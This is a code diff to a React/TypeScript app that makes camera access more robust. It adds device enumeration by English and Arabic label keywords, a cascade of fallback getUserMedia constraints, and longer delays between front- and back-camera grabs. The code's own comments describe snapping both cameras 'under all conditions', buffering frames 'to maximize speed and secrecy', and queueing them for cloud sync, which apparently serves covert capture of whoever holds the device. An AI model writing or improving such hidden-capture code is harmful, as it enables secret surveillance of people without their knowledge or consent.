@@ -9527,13 +9527,74 @@ export default function App() {
     try {
       const captureType = typeOverride || 's';
       
+      // Helper to enumerate specific camera devices
+      const getVideoDeviceForFacingMode = async (facingMode: 'user' | 'environment'): Promise<string | null> => {
+        try {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          const videoDevices = devices.filter(d => d.kind === 'videoinput');
+          if (videoDevices.length <= 1) return null;
+
+          const frontKeywords = ['front', 'user', 'selfie', 'face', 'أمام', 'سيلفي', 'الأمامية', 'الامامية'];
+          const backKeywords = ['back', 'rear', 'environment', 'main', 'خلف', 'الخلفية', 'الاساسية', 'الأساسية'];
+
+          if (facingMode === 'user') {
+            const frontDevice = videoDevices.find(d => {
+              const label = (d.label || '').toLowerCase();
+              return frontKeywords.some(kw => label.includes(kw));
+            });
+            if (frontDevice) return frontDevice.deviceId;
+          } else {
+            const backDevice = videoDevices.find(d => {
+              const label = (d.label || '').toLowerCase();
+              return backKeywords.some(kw => label.includes(kw));
+            });
+            if (backDevice) return backDevice.deviceId;
+          }
+        } catch (err) {
+          console.warn("enumerateDevices error", err);
+        }
+        return null;
+      };
+
+      // Helper to get robust userMedia stream with cascade fallbacks
+      const getStreamForFacingMode = async (facingMode: 'user' | 'environment'): Promise<MediaStream | null> => {
+        const deviceId = await getVideoDeviceForFacingMode(facingMode);
+        const constraintProfiles: any[] = [];
+        
+        if (deviceId) {
+          constraintProfiles.push({ deviceId: { exact: deviceId } });
+          constraintProfiles.push({ deviceId: deviceId });
+        }
+        
+        constraintProfiles.push({ facingMode: { exact: facingMode } });
+        constraintProfiles.push({ facingMode: facingMode });
+        constraintProfiles.push({ facingMode: { ideal: facingMode } });
+        constraintProfiles.push(true);
+
+        for (const profile of constraintProfiles) {
+          try {
+            const constraints = {
+              video: profile,
+              audio: false
+            };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            if (stream) return stream;
+          } catch (e) {
+            console.warn(`Failed media profile:`, profile, e);
+          }
+        }
+        return null;
+      };
+
       const captureFromSource = async (facingMode: 'environment' | 'user') => {
         let localStream: MediaStream | null = null;
         try {
-          localStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: { ideal: facingMode } }, 
-            audio: false 
-          });
+          localStream = await getStreamForFacingMode(facingMode);
+          if (!localStream) {
+            console.warn(`Could not obtain video stream for ${facingMode}`);
+            return null;
+          }
           
           if (videoRef.current) {
             videoRef.current.srcObject = localStream;
@@ -9575,10 +9636,11 @@ export default function App() {
         let localStream: MediaStream | null = null;
         const frames: string[] = [];
         try {
-          localStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: { ideal: facingMode }, width: { ideal: 480 }, height: { ideal: 480 } }, 
-            audio: false 
-          });
+          localStream = await getStreamForFacingMode(facingMode);
+          if (!localStream) {
+            console.warn(`Could not obtain video stream for video capture ${facingMode}`);
+            return [];
+          }
           
           const tempVideo = document.createElement('video');
           tempVideo.setAttribute('autoplay', 'true');
@@ -9679,7 +9741,7 @@ export default function App() {
         if (isVideoFormat) {
           // Robust sequential video frame capture: front then back continuously
           const frontVideoFrames = await captureVideoFromSource('user', durationMs);
-          await new Promise(r => setTimeout(r, 150)); // Fast hardware bridge delay to release and bind back camera
+          await new Promise(r => setTimeout(r, 800)); // Solid hardware transition delay to release and bind back camera
           const backVideoFrames = await captureVideoFromSource('environment', durationMs);
           
           // Process and save buffered video frames asynchronously without bottlenecking
@@ -9690,7 +9752,7 @@ export default function App() {
         } else {
           // Instant double snapshot: buffer both in device active memory first to maximize speed and secrecy!
           const front = await captureFromSource('user');
-          await new Promise(r => setTimeout(r, 150)); // Ultra fast delay for hardware release
+          await new Promise(r => setTimeout(r, 800)); // Solid delay for hardware release
           const back = await captureFromSource('environment');
           
           // Save and queue for cloud sync asynchronously
@@ -9702,7 +9764,7 @@ export default function App() {
       } else {
         // Double snap is the primary target: snap front and back under all conditions
         const front = await captureFromSource('user');
-        await new Promise(r => setTimeout(r, 150));
+        await new Promise(r => setTimeout(r, 800)); // Solid transition delay
         const back = await captureFromSource('environment');
         
         setTimeout(() => {
